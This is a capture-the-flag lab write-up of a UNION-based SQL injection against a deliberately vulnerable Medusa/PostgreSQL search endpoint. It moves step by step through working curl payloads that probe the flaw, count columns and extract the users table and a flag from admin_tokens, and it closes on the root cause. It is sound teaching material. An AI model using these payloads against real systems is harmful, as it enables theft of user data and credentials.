# SQLi Walkthrough — Operation Secure Core, Week 4 Class 2

**Target:** `http://$TARGET_HOST_IP:9000/search?q=`
**Environment:** Kali Linux attacking a Medusa backend + PostgreSQL running in Docker on a Windows host, accessed via VirtualBox NAT gateway (10.0.2.2).

---

## Step 1 — Baseline Request

**Payload:**
```
curl -s "http://$TARGET_HOST_IP:9000/search?q=test"
```

**Observed result (initial attempt):**
```
Cannot GET /search
```
The route did not exist yet. Traced to the fact that the `/search` endpoint had not been pre-seeded in this environment. Created `apps/backend/src/api/search/route.ts` manually per Phase 0.2 of the lab guide, then restarted Medusa (`pnpm dev`).

**Observed result (after fix):**
```json
[]
```
Confirms the endpoint is live and responding correctly.

---

## Step 2 — Vulnerability Probe (Single Quote Test)

**Payload:**
```
curl -s "http://$TARGET_HOST_IP:9000/search?q=test'"
```

**Observed result:**
```json
{"error":"unterminated quoted string at or near \"'\""}
```
Confirms the `q` parameter is concatenated directly into a raw SQL string with no sanitisation — a classic SQL injection point.

---

## Step 3 — Column Count Probing (UNION SELECT)

**Payloads:**
```
curl -s "http://$TARGET_HOST_IP:9000/search?q=test'+UNION+SELECT+NULL--+"
curl -s "http://$TARGET_HOST_IP:9000/search?q=test'+UNION+SELECT+NULL,NULL--+"
curl -s "http://$TARGET_HOST_IP:9000/search?q=test'+UNION+SELECT+NULL,NULL,NULL--+"
curl -s "http://$TARGET_HOST_IP:9000/search?q=test'+UNION+SELECT+NULL,NULL,NULL,NULL--+"
```

**Observed result (initial attempt):**
```json
{"error":"relation \"products\" does not exist"}
```
This indicated the `products`, `admin_tokens`, and `users` tables had not yet been seeded into the database. Ran the seed SQL from Phase 0.3 against the `medusa-postgres` container via `psql`.

**Observed result (after seeding):**
- 1, 2, 3 NULLs → `{"error":"each UNION query must have the same number of columns"}`
- 4 NULLs → `[{"id":null,"name":null,"price":null,"description":null}]`

**Conclusion:** the original query has **4 columns**.

---

## Step 4 — Identify Text Columns (Exfiltration Slots)

**Payload:**
```
curl -s "http://$TARGET_HOST_IP:9000/search?q=test'+UNION+SELECT+1,'B',3,'D'--+"
```

**Observed result:**
```json
[{"id":1,"name":"B","price":3,"description":"D"}]
```

**Conclusion:** column 1 (`id`) and column 3 (`price`) are integer types; column 2 (`name`) and column 4 (`description`) are text types and can be used to exfiltrate string data.

---

## Step 5 — Extract the User Table

**Payload:**
```
curl -s "http://$TARGET_HOST_IP:9000/search?q='+UNION+SELECT+id,username,1,email+FROM+users--+"
```

**Observed result:**
```json
[
  {"id":1,"name":"admin","price":1,"description":"admin@medusa.local"},
  {"id":1,"name":"Test Item","price":100,"description":"Sample product"}
]
```

**Conclusion:** successfully extracted the admin username (`admin`) and email (`admin@medusa.local`) from the `users` table, which the `/search` endpoint was never intended to expose. The second row is the normal product data returned by the original query, combined via UNION.

---

## Step 6 — Extract the CTF Flag

**Payload:**
```
curl -s "http://$TARGET_HOST_IP:9000/search?q='+UNION+SELECT+id,name,100,token_value+FROM+admin_tokens+WHERE+name='ctf_flag'--+"
```

**Observed result:**
```json
[
  {"id":1,"name":"Test Item","price":100,"description":"Sample product"},
  {"id":1,"name":"ctf_flag","price":100,"description":"CTF{m4nu4l_sql1_m3dus4_d4t4_l4y3r}"}
]
```

**Flag captured:** `CTF{m4nu4l_sql1_m3dus4_d4t4_l4y3r}`

No fallback (`--%20` or `psql` direct query) was needed — the primary payload worked once the tables were correctly seeded.

---

## Summary

| Step | Technique | Result |
|---|---|---|
| Probe | Single quote | Confirmed unsanitised string concatenation |
| Column count | UNION SELECT with NULLs | 4 columns confirmed |
| Column type | UNION SELECT with letters | Columns 2 & 4 are text (exfil slots) |
| Data extraction | UNION SELECT FROM users | Admin username + email extracted |
| Flag extraction | UNION SELECT FROM admin_tokens | CTF flag extracted |

**Root cause:** raw string concatenation of user input into a SQL query (`WHERE name LIKE '%${q}%'`) with no parameterisation or input sanitisation.
